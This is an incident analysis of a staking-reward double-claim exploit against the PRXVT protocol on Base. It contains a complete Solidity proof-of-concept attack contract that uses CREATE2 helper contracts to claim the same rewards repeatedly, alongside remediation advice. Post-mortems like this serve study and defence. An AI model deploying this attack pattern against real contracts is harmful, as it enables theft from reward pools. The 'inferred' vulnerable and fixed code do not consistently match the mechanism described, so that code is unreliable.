# PRXVT — Staking Reward Double-Claim via CREATE2 Helper Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-01 |
| **Protocol** | PRXVT |
| **Chain** | Base |
| **Loss** | 32.8 ETH |
| **Attacker** | Unknown |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | PRXVT Staking Contract |
| **Root Cause** | Transferring stPRXVT to CREATE2-deployed helper contracts causes each helper to be recognized as a new staker, enabling independent reward claims |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

PRXVT's staking system is designed to allow any address holding `stPRXVT` (staking receipt tokens) to claim rewards. Rewards are calculated based on the `stPRXVT` balance, and calling `claimReward()` distributes rewards to the calling address.

The vulnerability lies in the fact that after transferring `stPRXVT` to another address (a helper contract) and claiming, **both the original staker and the helper contract can each claim rewards against the same stPRXVT balance**.

The attacker deployed multiple helper contracts via CREATE2 and multiplied rewards N-fold by sequentially transferring stPRXVT to each helper, claiming, and returning the tokens.

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (Inferred)

```solidity
// ❌ Vulnerable: no double-claim prevention logic in reward claiming
contract PRXVTStaking {
    mapping(address => uint256) public staked;        // staked amount
    mapping(address => uint256) public rewardDebt;    // reward debt
    mapping(address => uint256) public lastClaimBlock; // last claim block

    // ❌ After stPRXVT transfer, the original staker's rewardDebt is not reset
    function stake(uint256 amount) external {
        stPRXVT.transferFrom(msg.sender, address(this), amount);
        staked[msg.sender] += amount;
        // ❌ No rewardDebt reset → rewards remain claimable even after transfer
    }

    function claimReward() external {
        uint256 reward = _calculateReward(msg.sender);
        // ❌ Even after transferring stPRXVT to another address,
        //    the original address still has staked record and can claim rewards
        rewardToken.transfer(msg.sender, reward);
        lastClaimBlock[msg.sender] = block.number;
    }

    // ❌ Reward calculated based on stPRXVT balance (original record persists even after transfer)
    function _calculateReward(address user) internal view returns (uint256) {
        return staked[user] * rewardRate * (block.number - lastClaimBlock[user]);
    }
}
```

### Fixed Code

```solidity
// ✅ Fix: settle rewards on stake/unstake + restrict transfers
contract PRXVTStaking {
    mapping(address => uint256) public staked;
    mapping(address => uint256) public pendingReward;
    mapping(address => uint256) public rewardPerTokenPaid;
    uint256 public rewardPerTokenStored;

    // ✅ Settle accrued rewards before staking
    function stake(uint256 amount) external updateReward(msg.sender) {
        stPRXVT.transferFrom(msg.sender, address(this), amount);
        staked[msg.sender] += amount;
    }

    // ✅ Settle rewards immediately on stPRXVT transfer (unstake)
    function unstake(uint256 amount) external updateReward(msg.sender) {
        staked[msg.sender] -= amount;
        stPRXVT.transfer(msg.sender, amount);
    }

    function claimReward() external updateReward(msg.sender) {
        uint256 reward = pendingReward[msg.sender];
        pendingReward[msg.sender] = 0;
        rewardToken.transfer(msg.sender, reward);
    }

    // ✅ Block stPRXVT transfers to contract addresses
    function _beforeTokenTransfer(address from, address to, uint256) internal override {
        require(!_isContract(to) || to == address(this), "Cannot transfer to contract");
    }

    modifier updateReward(address user) {
        rewardPerTokenStored = rewardPerToken();
        if (user != address(0)) {
            pendingReward[user] = earned(user);
            rewardPerTokenPaid[user] = rewardPerTokenStored;
        }
        _;
    }
}
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─[1] Stake PRXVT → receive stPRXVT
  │       staking.stake(N)
  │       attacker.staked = N
  │       attacker.lastClaimBlock = block.number
  │
  ├─[2] Deploy Helper Contract 1 via CREATE2
  │       Helper1 = new HelperContract{salt: 0x01}()
  │
  ├─[3] Transfer stPRXVT to Helper1
  │       stPRXVT.transfer(Helper1, N)
  │       ⚠️  attacker.staked = N (record preserved!)
  │       Helper1 balance: stPRXVT = N
  │
  ├─[4] Call Helper1.claimReward()
  │       Helper1 claims rewards for N stPRXVT
  │       → Helper1 receives rewards
  │
  ├─[5] Return stPRXVT to attacker
  │       Helper1 → Attacker
  │
  ├─[6] Call attacker.claimReward()
  │       ⚠️  attacker.staked = N record persists → same rewards claimed again!
  │       → Attacker also receives same rewards
  │
  ├─[7] Deploy Helper Contracts 2, 3, ... N via CREATE2
  │       Repeat steps [3]-[5] for each helper
  │       Number of helpers = K → rewards multiplied K+1 times
  │
  └─[8] Total profit: 32.8 ETH (tens of times the normal reward)
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPRXVTStaking {
    function claimReward() external;
    function stake(uint256 amount) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Helper contract deployed via CREATE2
contract StakingHelper {
    address owner;
    IPRXVTStaking staking;
    IERC20 stPRXVT;

    constructor(address _staking, address _stPRXVT) {
        owner = msg.sender;
        staking = IPRXVTStaking(_staking);
        stPRXVT = IERC20(_stPRXVT);
    }

    // Receive stPRXVT, claim rewards, then return tokens
    function claimAndReturn(address returnTo) external {
        require(msg.sender == owner);
        // Claim rewards (helper is recognized as new staker since it holds stPRXVT)
        staking.claimReward();
        // Return stPRXVT
        uint256 balance = stPRXVT.balanceOf(address(this));
        stPRXVT.transfer(returnTo, balance);
    }

    receive() external payable {}
}

contract PRXVTAttack {
    IPRXVTStaking constant staking = IPRXVTStaking(0x...);
    IERC20 constant PRXVT = IERC20(0x...);
    IERC20 constant stPRXVT = IERC20(0x...);

    uint256 constant NUM_HELPERS = 10; // number of helpers (rewards multiplied N+1 times)
    StakingHelper[] helpers;

    function attack() external {
        // [1] Stake PRXVT
        uint256 amount = PRXVT.balanceOf(address(this));
        PRXVT.approve(address(staking), amount);
        staking.stake(amount);

        // Wait for blocks (reward accumulation)
        // (in real attack, executed after time passes)

        // [2] Deploy helper contracts via CREATE2
        for (uint256 i = 0; i < NUM_HELPERS; i++) {
            bytes32 salt = bytes32(i);
            StakingHelper helper = new StakingHelper{salt: salt}(
                address(staking),
                address(stPRXVT)
            );
            helpers.push(helper);
        }

        uint256 stBalance = stPRXVT.balanceOf(address(this));

        // [3]-[6] Transfer stPRXVT to each helper → claim → return → attacker also claims
        for (uint256 i = 0; i < helpers.length; i++) {
            // Transfer stPRXVT to helper
            stPRXVT.transfer(address(helpers[i]), stBalance);

            // Helper claims rewards then returns stPRXVT
            helpers[i].claimAndReturn(address(this));

            // Attacker also claims rewards with same stPRXVT (duplicate!)
            staking.claimReward();
        }

        // Transfer profits
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Flaw — Staking Rewards |
| **Attack Vector** | Reward double-claiming via CREATE2 helper contracts |
| **Impact Scope** | Entire staking reward pool |
| **DASP Classification** | Business Logic Error |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | High |

### Detailed Description

The core of this vulnerability is that the staking record (`staked[user]`) is not updated when `stPRXVT` tokens are transferred. The original staker retains their record after transferring tokens to another address, allowing them to continue claiming rewards. At the same time, the new address that received the stPRXVT can also claim rewards based on its own balance.

CREATE2 enables contract deployment at predictable addresses, making it advantageous for attackers to efficiently create as many helper contracts as desired and repeat this process.

---

## 6. Remediation Recommendations

1. **Fix reward settlement timing**: When stPRXVT is transferred, immediately settle the sender's unclaimed rewards and update the record
2. **Implement transfer hooks**: Automatically update staking records in `_beforeTokenTransfer` or `_afterTokenTransfer`
3. **Restrict transfers to contract addresses**: Limit stPRXVT recipients to EOAs only (`require(!isContract(to))`)
4. **Reference the Synthetix reward model**: Calculate rewards using `rewardPerToken` accumulation (fair distribution regardless of transfer timing)
5. **Staking lock period**: Restrict transfers for a minimum of N blocks after staking to prevent short-term reward exploitation
6. **Limit maximum reward claim frequency**: Restrict the reward claim interval for a single address

---

## 7. Lessons Learned

- **Transferability of staking tokens introduces complex security issues**: If stPRXVT is transferable, staking records must also be updated upon transfer. Otherwise, double rewards for the same stake become possible.
- **CREATE2 can be weaponized**: The ability to generate addresses predictably can be exploited by attackers to efficiently deploy large numbers of helper contracts.
- **Reward designs must explicitly handle token transfer scenarios**: When staking receipt tokens move, the protocol's reward state must remain consistent.
- **The Synthetix-style cumulative reward model is more secure**: Tracking `rewardPerTokenStored` globally and computing rewards as the difference from each address's `rewardPerTokenPaid` is robust against transfer scenarios.